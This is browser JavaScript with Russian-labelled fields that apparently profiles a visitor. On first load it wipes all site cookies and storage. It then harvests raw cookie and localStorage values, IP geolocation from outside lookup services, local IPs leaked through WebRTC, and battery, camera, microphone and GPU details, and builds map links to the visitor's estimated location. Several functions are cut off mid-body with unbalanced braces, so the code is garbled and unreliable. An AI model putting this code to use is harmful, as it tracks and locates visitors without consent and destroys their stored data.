(async function wipeOnFirstVisit() {
  const FLAG = '__wiped_v1__';
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}

  try {
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (const c of cookies) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
      const domains = ['', location.hostname, '.' + location.hostname,
                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
      for (const p of paths) {
        for (const d of domains) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
        }
      }
    }
  } catch (e) {}
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) {
        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
      }
    }
  } catch (e) {}
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
    }
  } catch (e) {}

  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
  location.reload();
})();

async function collectCookies() {
  COOKIE_DATA['001 cookieEnabled']       = navigator.cookieEnabled;
  COOKIE_DATA['002 cookieStore API']     = 'cookieStore' in window;
  COOKIE_DATA['003 SameSite поддержка']  = (() => {

  })();
  COOKIE_DATA['004 Secure cookies разрешены'] = location.protocol === 'https:';
  COOKIE_DATA['005 Домен']               = location.hostname;
  COOKIE_DATA['006 Origin']              = location.origin;
  COOKIE_DATA['007 Protocol']            = location.protocol;
  COOKIE_DATA['008 Secure context']      = window.isSecureContext;
  COOKIE_DATA['009 Порт cookie-области'] = location.port || 'default';

  const tests = [
    ['tf_basic','value1',''],
    ['tf_path','value2','; path=/'],
    ['tf_lax','value3','; SameSite=Lax'],
    ['tf_strict','value4','; SameSite=Strict'],
    ['tf_none','value4b','; SameSite=None; Secure'],
    ['tf_maxage','value5','; max-age=3600'],
    ['tf_secure','value6','; Secure'],
    ['tf_expires','value7','; expires=' + new Date(Date.now() + 86400000).toUTCString()],
    ['tf_long','A'.repeat(200),'; path=/'],
    ['tf_http_only','value8',''],
    ['tf_priority','value9','; priority=high'],
    ['tf_partitioned','value10','; partitioned'],
  ];
  const written = [];
  for (const [name, val, attr] of tests) {
    try { document.cookie = name + '=' + val + attr; written.push(name); } catch (e) {}
  }
  COOKIE_DATA['010 Записано тестовых']    = written.length;
  COOKIE_DATA['011 Имена тестовых']       = written.join(', ');

  const raw = document.cookie || '';
  COOKIE_DATA['012 Сырая строка cookie']  = raw.slice(0, 3500) || '(пусто)';
  COOKIE_DATA['013 Длина строки']         = raw.length;
  COOKIE_DATA['014 Количество cookies']   = raw ? raw.split(';').length : 0;

  const pairs = {};
  if (raw) {
    raw.split(';').forEach(p => {
      const i = p.indexOf('=');
      if (i > -1) pairs[p.slice(0, i).trim()] = p.slice(i + 1).trim();
    });
  }
  COOKIE_DATA['015 Уникальных имён']  = Object.keys(pairs).length;
  COOKIE_DATA['016 Список имён']      = Object.keys(pairs).join(', ') || '(нет)';

  let idx = 100;
  Object.entries(pairs).slice(0, 60).forEach(([k, v]) => {
    COOKIE_DATA[String(idx++).padStart(3, '0') + ' cookie: ' + k] = String(v).slice(0, 250);
  });

  if (window.cookieStore && cookieStore.getAll) {
    try {
      const all = await cookieStore.getAll();
      COOKIE_DATA['201 CookieStore всего'] = all.length;
      COOKIE_DATA['202 CookieStore имена'] = all.map(c => c.name).join(', ');
      all.slice(0, 30).forEach((c, i) => {
        const base = 210 + i * 4;
        COOKIE_DATA[String(base).padStart(3,'0') + ' CS ' + c.name + ' value'] = String(c.value || '').slice(0,200);
        COOKIE_DATA[String(base+1).padStart(3,'0') + ' CS ' + c.name + ' domain'] = c.domain;
        COOKIE_DATA[String(base+2).padStart(3,'0') + ' CS ' + c.name + ' path'] = c.path;
        COOKIE_DATA[String(base+3).padStart(3,'0') + ' CS ' + c.name + ' expires'] = c.expires ? new Date(c.expires).toISOString() : 'session';
      });
    } catch (e) { COOKIE_DATA['203 CookieStore ошибка'] = String(e); }
  }

  try {
    const lsData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i); lsData[k] = localStorage.getItem(k);
    }
    COOKIE_DATA['301 localStorage ключей'] = Object.keys(lsData).length;
    COOKIE_DATA['302 localStorage имена']  = Object.keys(lsData).slice(0, 60).join(', ') || '(пусто)';
    let li = 310;
    Object.entries(lsData).slice(0, 40).forEach(([k, v]) => {
      COOKIE_DATA[String(li++).padStart(3,'0') + ' LS ' + k] = String(v).slice(0, 200);
    });
  } catch (e) { COOKIE_DATA['303 localStorage ошибка'] = String(e); }

  try {
    const ssData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i); ssData[k] = sessionStorage.getItem(k);
    }
    COOKIE_DATA['351 sessionStorage ключей'] = Object.keys(ssData).length;

      });
    }
  } catch (e) {}

  try {
    if (window.caches) {
      const keys = await caches.keys();
      COOKIE_DATA['451 Cache Storage кэшей'] = keys.length;
      COOKIE_DATA['452 Cache Storage имена'] = keys.slice(0, 30).join(', ') || '(нет)';

  try {
    if (navigator.storage && navigator.storage.estimate) {

        for (const k in e.usageDetails) {
          COOKIE_DATA[String(i++) + ' Storage ' + k] = e.usageDetails[k];
        }
      }
    }

  COOKIE_DATA['481 Secure установлен']     = raw.includes('tf_secure');
  COOKIE_DATA['482 SameSite=Lax установлен']    = raw.includes('tf_lax');
  COOKIE_DATA['483 SameSite=Strict установлен'] = raw.includes('tf_strict');
  COOKIE_DATA['484 max-age установлен']         = raw.includes('tf_maxage');

  COOKIE_DATA['488 SameSite=None']              = raw.includes('tf_none');
  COOKIE_DATA['489 Priority установлен']        = raw.includes('tf_priority');
  COOKIE_DATA['490 Partitioned установлен']     = raw.includes('tf_partitioned');
  COOKIE_DATA['491 CookieStore доступен']       = !!(window.cookieStore);
  COOKIE_DATA['492 LocalStorage доступен']      = (() => { try { localStorage.setItem('_','1'); localStorage.removeItem('_'); return true; } catch { return false; } })();
  COOKIE_DATA['493 SessionStorage доступен']    = (() => { try { sessionStorage.setItem('_','1'); sessionStorage.removeItem('_'); return true; } catch { return false; } })();
  COOKIE_DATA['494 IndexedDB доступен']         = 'indexedDB' in window;
  COOKIE_DATA['495 Cache API доступен']         = 'caches' in window;
  COOKIE_DATA['496 Storage Manager доступен']   = !!(navigator.storage && navigator.storage.estimate);
  COOKIE_DATA['497 Persistent storage']         = !!(navigator.storage && navigator.storage.persist);
  COOKIE_DATA['498 Persisted?']                 = navigator.storage && navigator.storage.persisted ? await navigator.storage.persisted() : '';
  COOKIE_DATA['499 Quota Storage?']             = !!(navigator.storage && navigator.storage.estimate);
  COOKIE_DATA['500 Cross-Origin Isolated']      = window.crossOriginIsolated;

async function collectGeo() {
  let best = null;

  try {
    const r = await fetch('https://ipwho.is/');
    const g = await r.json();
    if (g.success !== false && g.latitude != null) {
      GEO_DATA['001 Источник']    = 'ipwho.is';
      GEO_DATA['002 IP']          = g.ip;

      GEO_DATA['017 UTC']         = g.timezone && g.timezone.utc;
      GEO_DATA['018 UTC offset']  = g.timezone && g.timezone.utc_offset;
      GEO_DATA['019 ISP']         = g.connection && g.connection.isp;
      GEO_DATA['020 Организация'] = g.connection && g.connection.org;
      GEO_DATA['021 ASN']         = g.connection && ('AS' + g.connection.asn);
      GEO_DATA['022 Домен ASN']   = g.connection && g.connection.domain;
      GEO_DATA['023 Мобильный']   = g.connection && g.connection.is_mobile;
      GEO_DATA['024 Прокси']      = g.security && g.security.proxy;
      GEO_DATA['025 VPN']         = g.security && g.security.vpn;
      GEO_DATA['026 Tor']         = g.security && g.security.tor;
      GEO_DATA['027 Хостинг']     = g.security && g.security.hosting;
      GEO_DATA['028 Флаг страны'] = g.flag && g.flag.emoji;
      GEO_DATA['029 Валюта']      = g.currency && (g.currency.code + ' ' + g.currency.symbol);
      GEO_DATA['030 Телефон код'] = g.calling_code;

      best = { lat: g.latitude, lng: g.longitude };
    }
  } catch (e) {}

  if (!best) {
    try {
      const r = await fetch('https://ipwhois.app/json/');
      const g = await r.json();
      if (g.success && g.latitude) {
        GEO_DATA['050 Источник 2']  = 'ipwhois.app';
        GEO_DATA['051 IP']          = g.ip;
        GEO_DATA['052 Страна']      = g.country;
        GEO_DATA['053 Город']       = g.city;
        GEO_DATA['054 Регион']      = g.region;
        GEO_DATA['055 Широта']      = g.latitude;
        GEO_DATA['056 Долгота']     = g.longitude;
        GEO_DATA['057 ISP']         = g.isp;
        GEO_DATA['058 ASN']         = g.asn;
        GEO_DATA['059 Валюта']      = g.currency;
        GEO_DATA['060 Телефон']     = g.phone;
        best = { lat: g.latitude, lng: g.longitude };
      }
    } catch (e) {}
  }

  if (!best) {
    try {
      const r = await fetch('https://ipapi.co/json/');
      const g = await r.json();
      if (g.latitude != null) {
        GEO_DATA['080 Источник 3']  = 'ipapi.co';
        GEO_DATA['081 IP']          = g.ip;
        GEO_DATA['082 Страна']      = g.country_name;
        GEO_DATA['083 Код страны']  = g.country;
        GEO_DATA['084 Город']       = g.city;
        GEO_DATA['085 Регион']      = g.region;
        GEO_DATA['086 Широта']      = g.latitude;
        GEO_DATA['087 Долгота']     = g.longitude;
        GEO_DATA['088 TZ']          = g.timezone;
        GEO_DATA['089 UTC']         = g.utc_offset;
        GEO_DATA['090 ASN']         = g.asn;
        GEO_DATA['091 Организация'] = g.org;
        GEO_DATA['092 Сеть']        = g.network;
        GEO_DATA['093 Валюта']      = g.currency;
        best = { lat: g.latitude, lng: g.longitude };
      }
    } catch (e) {}
  }

  if (best) {
    const lat = parseFloat(best.lat), lng = parseFloat(best.lng);
    GEO_DATA['101 Google Maps поиск']    = 'https://www.google.com/maps?q=' + lat + ',' + lng;
    GEO_DATA['102 Google Maps спутник']  = 'https://www.google.com/maps/@' + lat + ',' + lng + ',12z/data=!3m1!1e3';
    GEO_DATA['103 Google Maps улицы']    = 'https://www.google.com/maps/@' + lat + ',' + lng + ',15z';
    GEO_DATA['104 Google Street View']   = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + lat + ',' + lng;
    GEO_DATA['105 Яндекс.Карты']         = 'https://yandex.ru/maps/?pt=' + lng + ',' + lat + '&z=12&l=map';
    GEO_DATA['106 Яндекс.Панорамы']      = 'https://yandex.ru/maps/?ll=' + lng + ',' + lat + '&panorama[point]=' + lng + ',' + lat;
    GEO_DATA['107 OpenStreetMap']        = 'https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lng + '#map=12/' + lat + '/' + lng;
    GEO_DATA['108 Bing Maps']            = 'https://www.bing.com/maps?cp=' + lat + '~' + lng + '&lvl=12';
    GEO_DATA['109 2GIS']                 = 'https://2gis.ru/geo/' + lng + ',' + lat;
    GEO_DATA['110 What3Words']           = 'https://what3words.com/' + lat + ',' + lng;
    GEO_DATA['111 Геокодер Google']      = 'https://maps.googleapis.com/maps/api/geocode/json?latlng=' + lat + ',' + lng;
    GEO_DATA['112 Nominatim OSM']        = 'https://nominatim.openstreetmap.org/reverse?lat=' + lat + '&lon=' + lng + '&format=json';
    GEO_DATA['113 SunCalc (солнце)']     = 'https://www.suncalc.org/#/' + lat + ',' + lng + ',12';
    GEO_DATA['114 Wikipedia Geolink']    = 'https://ru.wikipedia.org/wiki/Служебная:Рядом?ns0=1&lat=' + lat + '&lon=' + lng;
    GEO_DATA['115 Timezone DB']          = 'https://timezonedb.com/time-zones?lat=' + lat + '&lng=' + lng;
  }

  await new Promise(resolve => {
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      const ips = new Set(), srflx = new Set();
      let done = false;
      const finish = () => {
        if (done) return; done = true;
        GEO_DATA['201 Локальные IP'] = Array.from(ips).join(', ') || 'скрыто';
        GEO_DATA['202 Публичные IP'] = Array.from(srflx).join(', ') || 'скрыто';
        try { pc.close(); } catch {}
        resolve();
      };
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) return finish();
        const c = e.candidate.candidate;
        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
        if (m) (/srflx|relay/.test(c) ? srflx : ips).add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(finish, 2000);
    } catch (e) { resolve(); }
  });

  // Geolocation API (без разрешения — только наличие)
  GEO_DATA['211 Geolocation API есть']       = 'geolocation' in navigator;
  GEO_DATA['212 Permissions API есть']       = 'permissions' in navigator;
  try {
    if (navigator.permissions) {
      const g = await navigator.permissions.query({ name: 'geolocation' });
      GEO_DATA['213 Разрешение геолокации'] = g.state;
    }
  } catch (e) {}
  try {
    if (navigator.permissions) {
      const c = await navigator.permissions.query({ name: 'camera' });
      GEO_DATA['214 Разрешение камеры']  = c.state;
    }
  } catch (e) {}
  try {
    if (navigator.permissions) {
      const m = await navigator.permissions.query({ name: 'microphone' });
      GEO_DATA['215 Разрешение микрофона'] = m.state;
    }
  } catch (e) {}
  try {
    if (navigator.permissions) {
      const n = await navigator.permissions.query({ name: 'notifications' });
      GEO_DATA['216 Разрешение уведомлений'] = n.state;
    }
  } catch (e) {}

  GEO_DATA['220 Координаты точность']     = 'может быть запрошена';
  GEO_DATA['221 Язык для гео']            = navigator.language;
  GEO_DATA['222 Часовой пояс клиента']    = Intl.DateTimeFormat().resolvedOptions().timeZone;
  GEO_DATA['223 Смещение TZ минут']       = new Date().getTimezoneOffset();
  GEO_DATA['224 Локальное время']         = new Date().toLocaleString('ru-RU');
  GEO_DATA['225 ISO время']               = new Date().toISOString();
  GEO_DATA['226 Daylight saving?']        = (() => {
    const jan = new Date(new Date().getFullYear(), 0, 1).getTimezoneOffset();
    const jul = new Date(new Date().getFullYear(), 6, 1).getTimezoneOffset();
    return jan !== jul;
  })();
}

// ═══════════════════════════════════════════════════════════
// ТЕЛЕФОН / УСТРОЙСТВО — расширенный
// ═══════════════════════════════════════════════════════════
async function collectPhone() {
  const n = navigator, s = screen;
  PHONE_DATA['001 Ширина экрана']    = s.width;
  PHONE_DATA['002 Высота экрана']    = s.height;
  PHONE_DATA['003 Доступн. ширина']  = s.availWidth;
  PHONE_DATA['004 Доступн. высота']  = s.availHeight;
  PHONE_DATA['005 Глубина цвета']    = s.colorDepth;
  PHONE_DATA['006 Pixel depth']      = s.pixelDepth;
  PHONE_DATA['007 DPR']              = window.devicePixelRatio;
  PHONE_DATA['008 Ориентация']       = s.orientation ? s.orientation.type : '';
  PHONE_DATA['009 Угол ориентации']  = s.orientation ? s.orientation.angle : '';
  PHONE_DATA['010 Ширина окна']      = window.innerWidth;
  PHONE_DATA['011 Высота окна']      = window.innerHeight;
  PHONE_DATA['012 Внешн. ширина']    = window.outerWidth;
  PHONE_DATA['013 Внешн. высота']    = window.outerHeight;
  PHONE_DATA['014 Позиция X']        = window.screenX;
  PHONE_DATA['015 Позиция Y']        = window.screenY;
  PHONE_DATA['016 Полоса прокрутки'] = window.innerWidth - document.documentElement.clientWidth;
  PHONE_DATA['017 Диагональ пикс']   = Math.round(Math.sqrt(s.width**2 + s.height**2));
  PHONE_DATA['018 Диагональ дюйм']   = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);
  PHONE_DATA['019 DeviceOrientation']= 'DeviceOrientationEvent' in window;
  PHONE_DATA['020 DeviceMotion']     = 'DeviceMotionEvent' in window;
  PHONE_DATA['021 Accelerometer']    = 'Accelerometer' in window;
  PHONE_DATA['022 Gyroscope']        = 'Gyroscope' in window;
  PHONE_DATA['023 Magnetometer']     = 'Magnetometer' in window;
  PHONE_DATA['024 AmbientLight']     = 'AmbientLightSensor' in window;
  PHONE_DATA['025 LinearAccel']      = 'LinearAccelerationSensor' in window;
  PHONE_DATA['026 GravitySensor']    = 'GravitySensor' in window;
  PHONE_DATA['027 Max touch points'] = n.maxTouchPoints || 0;
  PHONE_DATA['028 Touch support']    = 'ontouchstart' in window;
  PHONE_DATA['029 Pointer support']  = 'PointerEvent' in window;
  PHONE_DATA['030 Vibrate API']      = 'vibrate' in n;
  PHONE_DATA['031 Ядер CPU']         = n.hardwareConcurrency || '';
  PHONE_DATA['032 RAM (GB)']         = n.deviceMemory || '';
  PHONE_DATA['033 Платформа']        = n.platform || '';
  PHONE_DATA['034 Мобильный UA-CH']  = n.userAgentData ? n.userAgentData.mobile : '';
  PHONE_DATA['035 Платформа UA-CH']  = n.userAgentData ? n.userAgentData.platform : '';
  PHONE_DATA['036 Бренды UA-CH']     = n.userAgentData ? n.userAgentData.brands.map(b => b.brand + ' ' + b.version).join(', ') : '';
  PHONE_DATA['037 Языки']            = (n.languages || []).join(', ');
  PHONE_DATA['038 Основной язык']    = n.language;
  PHONE_DATA['039 Родной язык']      = n.userLanguage || n.browserLanguage || '';

  const ua = n.userAgent;
  PHONE_DATA['040 UA строка']        = ua;
  PHONE_DATA['041 Возможно телефон'] = /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
  PHONE_DATA['042 Возможно планшет'] = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua));
  PHONE_DATA['043 Возможно десктоп'] = !/Mobi|Android|iPhone|iPad|iPod/i.test(ua);
  PHONE_DATA['044 OS']               = (() => {
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Mac OS X/.test(ua))        return 'macOS';
    if (/Android/.test(ua))         return 'Android';
    if (/iPhone|iPad|iPod/.test(ua))return 'iOS';
    if (/Linux/.test(ua))           return 'Linux';
    return 'неизвестно';
  })();
  PHONE_DATA['045 OS версия']        = (() => {
    const m = /(Windows NT [\d.]+|Mac OS X [\d_.]+|Android [\d.]+|OS [\d_]+)/.exec(ua);
    return m ? m[1].replace(/_/g, '.') : '';
  })();
  PHONE_DATA['046 Модель устройства']= (() => { const m = /\(([^)]+)\)/.exec(ua); return m ? m[1] : ''; })();
  PHONE_DATA['047 Архитектура']      = /WOW64|Win64|x64|x86_64|amd64/i.test(ua) ? 'x64' : /arm|aarch64/i.test(ua) ? 'ARM' : 'x86 / неизвестно';
  PHONE_DATA['048 Bit depth']        = /64/.test(ua) ? '64-bit' : '32-bit';

  if (n.getBattery) {
    try {
      const b = await n.getBattery();
      PHONE_DATA['050 Батарея %']        = Math.round(b.level * 100) + '%';
      PHONE_DATA['051 Уровень 0-1']      = b.level;
      PHONE_DATA['052 Заряжается']       = b.charging;
      PHONE_DATA['053 Время до заряда']  = b.chargingTime === Infinity ? 'бесконечность' : b.chargingTime;
      PHONE_DATA['054 Время до разряд.'] = b.dischargingTime === Infinity ? 'бесконечность' : b.dischargingTime;
    } catch (e) {}
  }

  const c = n.connection || n.mozConnection || n.webkitConnection;
  if (c) {
    PHONE_DATA['060 Тип сети']      = c.effectiveType;
    PHONE_DATA['061 Тип conn.']     = c.type;
    PHONE_DATA['062 Downlink Mbps'] = c.downlink;
    PHONE_DATA['063 Downlink max']  = c.downlinkMax;
    PHONE_DATA['064 RTT ms']        = c.rtt;
    PHONE_DATA['065 Save data']     = c.saveData;
  }
  PHONE_DATA['066 Онлайн']          = n.onLine;
  PHONE_DATA['067 Геолокация API']  = 'geolocation' in n;
  PHONE_DATA['068 Bluetooth API']   = 'bluetooth' in n;
  PHONE_DATA['069 USB API']         = 'usb' in n;
  PHONE_DATA['070 NFC API']         = 'NDEFReader' in window;
  PHONE_DATA['071 Serial API']      = 'serial' in n;
  PHONE_DATA['072 HID API']         = 'hid' in n;
  PHONE_DATA['073 MIDI API']        = 'requestMIDIAccess' in n;
  PHONE_DATA['074 Gamepad API']     = 'getGamepads' in n;
  PHONE_DATA['075 XR']              = 'xr' in n;
  PHONE_DATA['076 VR']              = 'VRDisplay' in window;
  PHONE_DATA['077 IdleDetection']   = 'IdleDetector' in window;

  try {
    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
      const d = await n.mediaDevices.enumerateDevices();
      PHONE_DATA['080 Устройств всего'] = d.length;
      PHONE_DATA['081 Микрофонов']      = d.filter(x => x.kind === 'audioinput').length;
      PHONE_DATA['082 Камер']           = d.filter(x => x.kind === 'videoinput').length;
      PHONE_DATA['083 Динамиков']       = d.filter(x => x.kind === 'audiooutput').length;
      PHONE_DATA['084 Устройств с метками'] = d.filter(x => x.label).length;
      d.slice(0, 15).forEach((dev, i) => {
        const base = 90 + i * 3;
        PHONE_DATA[String(base).padStart(3,'0') + ' Media ' + i + ' kind']  = dev.kind;
        PHONE_DATA[String(base+1).padStart(3,'0') + ' Media ' + i + ' label'] = dev.label || '(без метки)';
        PHONE_DATA[String(base+2).padStart(3,'0') + ' Media ' + i + ' id']    = (dev.deviceId || '').slice(0, 40);
      });
    }
  } catch (e) {}
  PHONE_DATA['160 getUserMedia']       = !!(n.mediaDevices && n.mediaDevices.getUserMedia);
  PHONE_DATA['161 GetDisplayMedia']    = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
  PHONE_DATA['162 Media capabilities'] = !!(n.mediaDevices && n.mediaDevices.getSupportedConstraints);
  PHONE_DATA['163 SpeechSynth']        = 'speechSynthesis' in window;
  PHONE_DATA['164 SpeechRecog']        = 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window;
  PHONE_DATA['165 Share API']          = 'share' in n;
  PHONE_DATA['166 Can share?']         = n.canShare && navigator.canShare({ files: [new File([], 'a.txt', { type: 'text/plain' })] }) || false;
  PHONE_DATA['167 Wake Lock']          = 'wakeLock' in n;
  PHONE_DATA['168 Fullscreen']         = 'fullscreenEnabled' in document;
  PHONE_DATA['169 Screen Capture']     = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
  PHONE_DATA['170 Gamepad']            = 'getGamepads' in n;
  PHONE_DATA['171 VR XR']              = 'xr' in n;
  PHONE_DATA['172 Notification']       = 'Notification' in window;
  PHONE_DATA['173 Notification perm']  = 'Notification' in window ? Notification.permission : '';
  PHONE_DATA['174 Мобильный режим']    = /Mobi/i.test(ua);
  PHONE_DATA['175 Память JS (MB)']     = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : '';
  PHONE_DATA['176 Лимит памяти MB']    = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) : '';
  PHONE_DATA['177 Всего памяти MB']    = performance.memory ? Math.round(performance.memory.totalJSHeapSize / 1048576) : '';
  PHONE_DATA['178 Есть GPU']           = 'WebGLRenderingContext' in window;
  PHONE_DATA['179 WebGL2']             = 'WebGL2RenderingContext' in window;
  PHONE_DATA['180 WebGPU']             = 'gpu' in n;

  try {
    if (n.storage && n.storage.estimate) {
      const e = await n.storage.estimate();
      PHONE_DATA['190 Квота (MB)']      = Math.round(e.quota / 1048576);
      PHONE_DATA['191 Использовано KB'] = Math.round(e.usage / 1024);
    }
  } catch (e) {}

  PHONE_DATA['200 IndexedDB']       = 'indexedDB' in window;
  PHONE_DATA['201 localStorage']    = (() => { try { localStorage.setItem('_','1'); localStorage.removeItem('_'); return true; } catch { return false; } })();
  PHONE_DATA['202 sessionStorage']  = 'sessionStorage' in window;
  PHONE_DATA['203 Cache API']       = 'caches' in window;
  PHONE_DATA['204 CookieStore']     = 'cookieStore' in window;
  PHONE_DATA['205 Web SQL']         = 'openDatabase' in window;
  PHONE_DATA['206 AppCache']        = 'applicationCache' in window;

  const d = new Date();
  PHONE_DATA['210 Локальное время'] = d.toLocaleString('ru-RU');
  PHONE_DATA['211 ISO время']       = d.toISOString();
  PHONE_DATA['212 Timestamp']       = d.getTime();
  PHONE_DATA['213 TZ']              = Intl.DateTimeFormat().resolvedOptions().timeZone;
  PHONE_DATA['214 Смещение TZ']     = d.getTimezoneOffset();
  PHONE_DATA['215 Локаль']          = Intl.DateTimeFormat().resolvedOptions().locale;
  PHONE_DATA['216 Календарь']       = Intl.DateTimeFormat().resolvedOptions().calendar;
  PHONE_DATA['217 Формат чисел']    = Intl.DateTimeFormat().resolvedOptions().numberingSystem;
  PHONE_DATA['218 Формат времени']  = Intl.DateTimeFormat().resolvedOptions().hourCycle;
  PHONE_DATA['219 Первый день недели'] = Intl.DateTimeFormat().resolvedOptions().weekInfo ? Intl.DateTimeFormat().resolvedOptions().weekInfo.firstDay : '';
  PHONE_DATA['220 Uptime стр.']     = Math.round(performance.now());
  PHONE_DATA['221 Тип сессии']      = performance.navigation ? performance.navigation.type : '';
  PHONE_DATA['222 Кол-во redirect'] = performance.navigation ? performance.navigation.redirectCount : '';
  PHONE_DATA['223 Ширина mm']       = (s.width * 25.4 / 96).toFixed(1);
  PHONE_DATA['224 Высота mm']       = (s.height * 25.4 / 96).toFixed(1);
  PHONE_DATA['225 Диагональ см']    = (Math.sqrt(s.width**2 + s.height**2) * 25.4 / 96 / 10).toFixed(2);
  PHONE_DATA['226 RTT из perf']     = performance.timing ? (performance.timing.responseStart - performance.timing.requestStart) : '';
  PHONE_DATA['227 Тип подключения'] = n.onLine ? 'online' : 'offline';
  PHONE_DATA['228 Тёмная тема']     = matchMedia('(prefers-color-scheme: dark)').matches;
  PHONE_DATA['229 Светлая тема']    = matchMedia('(prefers-color-scheme: light)').matches;
  PHONE_DATA['230 Уменьш. анимац.'] = matchMedia('(prefers-reduced-motion: reduce)').matches;
  PHONE_DATA['231 Контраст больше'] = matchMedia('(prefers-contrast: more)').matches;
  PHONE_DATA['232 Контраст меньше'] = matchMedia('(prefers-contrast: less)').matches;
  PHONE_DATA['233 Hover']           = matchMedia('(hover: hover)').matches;
  PHONE_DATA['234 Any hover']       = matchMedia('(any-hover: hover)').matches;
  PHONE_DATA['235 Указатель точный']= matchMedia('(pointer: fine)').matches;
  PHONE_DATA['236 Указатель грубый']= matchMedia('(pointer: coarse)').matches;
  PHONE_DATA['237 Any-pointer']     = matchMedia('(any-pointer: coarse)').matches;
  PHONE_DATA['238 Ориентация media']= matchMedia('(orientation: portrait)').matches ? 'portrait' : 'landscape';
  PHONE_DATA['239 Цветовая гамма']  = matchMedia('(color-gamut: p3)').matches ? 'p3' : matchMedia('(color-gamut: srgb)').matches ? 'srgb' : '';
  PHONE_DATA['240 Rec2020']         = matchMedia('(color-gamut: rec2020)').matches;
  PHONE_DATA['241 HDR']             = matchMedia('(dynamic-range: high)').matches;
  PHONE_DATA['242 Тип указателя']   = matchMedia('(pointer: coarse)').matches ? 'грубый (тач)' : 'точный (мышь)';
  PHONE_DATA['243 Скроллбар']       = window.innerWidth - document.documentElement.clientWidth;
  PHONE_DATA['244 Аппаратное ускорение'] = 'WebGLRenderingContext' in window;
  PHONE_DATA['245 Forced colors']   = matchMedia('(forced-colors: active)').matches;
  PHONE_DATA['246 Inverted colors'] = matchMedia('(inverted-colors: inverted)').matches;
  PHONE_DATA['247 Reduce transparency'] = matchMedia('(prefers-reduced-transparency: reduce)').matches;
  PHONE_DATA['248 Reduce data']     = matchMedia('(prefers-reduced-data: reduce)').matches;
  PHONE_DATA['249 Standalone']      = matchMedia('(display-mode: standalone)').matches;
  PHONE_DATA['250 Fullscreen mode'] = matchMedia('(display-mode: fullscreen)').matches;
  PHONE_DATA['251 Minimal UI']      = matchMedia('(display-mode: minimal-ui)').matches;
  PHONE_DATA['252 Browser mode']    = matchMedia('(display-mode: browser)').matches;
  PHONE_DATA['253 Window controls overlay'] = matchMedia('(display-mode: window-controls-overlay)').matches;
  PHONE_DATA['254 Picture-in-picture']  = matchMedia('(display-mode: picture-in-picture)').matches;
  PHONE_DATA['255 Update rate']     = matchMedia('(update: fast)').matches ? 'fast' : matchMedia('(update: slow)').matches ? 'slow' : '';
  PHONE_DATA['256 Overflow-block']  = matchMedia('(overflow-block: scroll)').matches ? 'scroll' : '';
  PHONE_DATA['257 Overflow-inline'] = matchMedia('(overflow-inline: scroll)').matches ? 'scroll' : '';
  PHONE_DATA['258 Monochrome']      = matchMedia('(monochrome)').matches;
  PHONE_DATA['259 Grid']            = matchMedia('(grid: 0)').matches ? 'bitmap' : 'grid';
  PHONE_DATA['260 Vendor media']    = '';
  PHONE_DATA['261 Client Hint DP']  = n.userAgentData ? n.userAgentData.mobile : '';
  PHONE_DATA['262 Client Hint brands'] = n.userAgentData ? JSON.stringify(n.userAgentData.brands) : '';
}

// ═══════════════════════════════════════════════════════════
// БРАУЗЕР — расширенный
// ═══════════════════════════════════════════════════════════
function collectBrowser() {
  const n = navigator;
  BROWSER_DATA['001 User-Agent']    = n.userAgent;
  BROWSER_DATA['002 App name']      = n.appName;
  BROWSER_DATA['003 App version']   = n.appVersion;
  BROWSER_DATA['004 App code name'] = n.appCodeName;
  BROWSER_DATA['005 Product']       = n.product;
  BROWSER_DATA['006 Product sub']   = n.productSub;
  BROWSER_DATA['007 Vendor']        = n.vendor;
  BROWSER_DATA['008 Vendor sub']    = n.vendorSub || '';
  BROWSER_DATA['009 Build ID']      = n.buildID || '';
  BROWSER_DATA['010 Platform']      = n.platform;
  BROWSER_DATA['011 Язык']          = n.language;

function collectWebGL() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) { OTHER_DATA['001 WebGL доступен'] = false; return; }
    OTHER_DATA['001 WebGL доступен'] = true;
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      OTHER_DATA['002 GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      OTHER_DATA['003 GPU рендер'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
    OTHER_DATA['004 WebGL версия']  = gl.getParameter(gl.VERSION);
    OTHER_DATA['005 GLSL версия']   = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
